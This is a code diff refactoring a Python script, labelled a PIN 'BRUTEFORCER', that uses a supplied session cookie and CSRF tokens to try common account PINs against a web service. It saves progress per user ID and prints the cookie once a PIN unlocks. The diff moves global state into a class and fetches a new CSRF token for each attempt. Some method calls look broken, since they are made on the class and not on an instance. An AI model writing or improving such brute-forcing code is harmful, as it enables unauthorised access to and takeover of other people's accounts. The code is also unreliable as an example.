@@ -1,7 +1,6 @@
 # --({ Import Modules })
-import subprocess, json, time, os
+import subprocess, requests, json, time, os
 try:
-  import requests
   from termcolor import cprint
 except:
   try:
@@ -20,9 +19,7 @@ except:
   print("] " , end="")
   print('\033[31m'+"Packages not installed. Installing now...")
   subprocess.call("pip install termcolor", shell=True)
-  subprocess.call("pip install requests", shell=True)
 finally:
-  import requests
   from termcolor import cprint
 # --({ Get Xsrf Token }) -- #
 def getXsrf(cookie):
@@ -36,19 +33,20 @@ def clear():
     os.system("cls")
   else:
     os.system("clear")
-# --({ Diagnose Errors }) -- #
-def diagnose(error):
-    global headers
-    global cookies
+# --({ Crack Pin }) -- #
+class crack:
+  # --({ Diagnose Errors }) -- #
+  def diagnose(self, error, _):
+    cookie = self.cookie
+    print("[", end="")
+    cprint(" ERROR ", "red", end="")
+    print("] " , end="")
+    print(f"ERROR {error}")
     try:
       cookie
       headers = {
       'X-CSRF-TOKEN': getXsrf(cookie),
       }
-      print("[", end="")
-      cprint(" ERROR ", "red", end="")
-      print("] " , end="")
-      print(f"ERROR {error}")
       print("[", end="")
       cprint(" ERROR ", "red", end="")
       print("] " , end="")
@@ -84,17 +82,8 @@ def diagnose(error):
       cprint(" ERROR ", "red", end="")
       print("] " , end="")
       print(f"Error occured with the program or your computer.")
-# --({ Crack Pin }) -- #
-class crack:
-  global headers
-  global response
-  global pin
-  global cookies
   # --({ Check Cookie }) -- #
-  def check(_):
-    global cookie
-    global webhook
-    global continueProgress
+  def check(self):
     yes = ["y", "yes", "yeah", "ye"]
     print("[", end="")
     cprint(" BRUTEFORCER ", "magenta", end="")
@@ -124,16 +113,15 @@ class crack:
       time.sleep(1)
       clear()
       crack.check()
+    self.cookie = cookie
+    self.continueProgress = continueProgress
   # --({ Start Cracker }) -- #
-  def start(_):
-    global headers
-    global response
-    global pin
-    global cookies
-    global continueProgress
+  def start(self):
     # --({ Allow cprint to work in windows }) -- #
     os.system("")
     crack.check()
+    continueProgress = self.continueProgress
+    cookie = self.cookie
     # --({ Check for files }) -- #
     if not os.path.exists("progress.json"):
       print("[", end="")
@@ -171,9 +159,6 @@ class crack:
     # --({ Try all the most common pins }) -- #
     clear()
     time.sleep(1)
-    headers = {
-    'X-CSRF-TOKEN': getXsrf(cookie),
-    }
     # --({ Start from progress saved }) -- #
     if continueProgress:
       try:
@@ -196,6 +181,9 @@ class crack:
       cprint(" BRUTEFORCER ", "magenta", end="")
       print("] " , end="")
       cprint(f"Trying {pin}...", "magenta")
+      headers = {
+      'X-CSRF-TOKEN': getXsrf(cookie),
+      }
       progress = json.load(open("progress.json", "r"))
       with open("progress.json", "w+") as f:
         progress[str(userid)] = int(line+startingLine)
@@ -205,6 +193,9 @@ class crack:
       # --({ Check if the pin was found }) -- #
       try:
           if "unlockedUntil" in str(response):
+            print("[", end="")
+            cprint(" BRUTEFORCER ", "blue", end="")
+            print("] " , end="")
             cprint("Cookie:", 'blue')
             print(cookie)
             print("[", end="")
@@ -262,4 +253,4 @@ if __name__ == "__main__":
   try:
     crack.start()
   except Exception as e:
-    diagnose(e)
+    crack.diagnose(e)
